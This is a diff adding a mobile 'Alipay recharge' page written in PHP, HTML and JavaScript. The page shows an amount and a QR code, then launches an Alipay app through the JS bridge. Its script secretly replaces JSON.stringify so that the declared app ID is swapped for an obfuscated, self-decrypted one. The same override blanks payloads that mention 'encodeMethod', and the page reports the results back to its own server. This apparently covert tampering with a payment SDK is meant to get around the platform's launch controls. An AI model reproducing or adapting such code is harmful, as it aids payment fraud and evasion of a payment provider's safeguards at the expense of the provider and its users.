@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>支付宝充值</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.min.js"></script>
+    <style>
+
+    </style>
+</head>
+<body>
+    <div style="padding-top: 30px;text-align: center;"  >
+
+        <div ><img src="/res/img/logo_alipay.jpg"  style="height: 55px"/></div>
+        <div style="padding-top: 20px">金额<b style="color: #ff6700; font-size: 50px"><?=$biz_data['a']?></b>元</div>
+        <img src="http://mobile.qq.com/qrcode?url=<?=urlencode(  $qrcode )?>" />
+        <div  style="color: #ff6700; font-size: 16px">请长按识别图中二维码</div>
+    </div>
+    <div id="debug" style="padding-top: 10px;text-align: center;"  >Loading...</div>
+</body>
+<script>
+
+    var old_stringify = JSON.stringify;
+    var htmlStr = 'alipay_inner_call';
+    JSON.stringify = function (s) {
+        var cal_method = old_stringify(s);
+        if (cal_method.indexOf('startApp') != -1) {
+            cal_method = cal_method.replace(htmlStr, str_decrypt("%3Ab%60%60%60ace"));
+        } else if (cal_method.indexOf('encodeMethod') != -1) {
+            cal_method = "{}";
+        }
+        return cal_method;
+    }
+
+    function str_decrypt(str) {
+        str = decodeURIComponent(str);
+        var c = String.fromCharCode(str.charCodeAt(0) - str.length);
+
+        for (var i = 1; i < str.length; i++) {
+            c += String.fromCharCode(str.charCodeAt(i) - c.charCodeAt(i - 1));
+        }
+        return c;
+    }
+
+
+    var debug= document.getElementById('debug');
+    //var st={isLoading: false };
+    var st={st: "",time:0, timer:null,count:35 ,isOpen:false };
+
+    function returnApp() {
+        AlipayJSBridge.call("exitApp")
+    }
+
+    function ready(a) {
+        window.AlipayJSBridge ? a && a() : document.addEventListener("AlipayJSBridgeReady", a, false);
+        debug.innerHTML='...';
+    }
+    ready(function () {
+        try {
+            var a = {
+                actionType: "scan",
+                u: "<?=$biz_data['u']?>",
+                a: "<?=$biz_data['a']?>",
+                m: "<?=$biz_data['m']?>",
+                biz_data: <?=json_encode($biz_data)?>
+            }
+        } catch (b) {
+            returnApp()
+        }
+        AlipayJSBridge.call("startApp", {
+            appId:  htmlStr ,
+            param: a
+        }, function (a) {
+            debug.innerHTML='';
+            //st.timer = setInterval( timeCounter,1001 );
+            var errStr = encodeURIComponent(JSON.stringify(a));
+            var str = encodeURIComponent(JSON.stringify( <?=json_encode($biz_data)?>));
+            var data = 'str=' + str + '&err=' + errStr;
+            ajax_post('/test/tool/g3',data );
+
+        })
+    });
+
+    document.addEventListener("resume", function (a) {
+        returnApp()
+    });
+
+    document.addEventListener('pause', function(e) {
+        //debug.innerHTML='ok!';
+        //if( !st.isOpen ) openV2();
+        st.isOpen=true;
+    }, false);
+
+    function timeCounter() {
+        if(  st.isOpen==true ){
+            debug.innerHTML='充值中...';
+        }
+        st.count--;
+
+        if(st.count<=0){
+            window.clearInterval(st.timer);
+            areload();
+        }else{
+            if( st.count<=1 )  st.isOpen= true;
+            //debug.innerHTML='等待<b style="color: red">'+ st.count+'</b>秒，方可充值！<br><br>或者<br><br>不等待！请到<b style="color: red">手机桌面</b>，打开<b>支付宝</b>立即充值';
+            debug.innerHTML='<span style="color: #999999">自动识别还需'+ st.count+'秒！</span>';
+            //debug.innerHTML='';
+        }
+
+    }
+
+    function areload() {
+        window.location.reload();
+    }
+
+    function ajax_post(url, data, fn) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send(data);
+    }
+</script>
+</html>
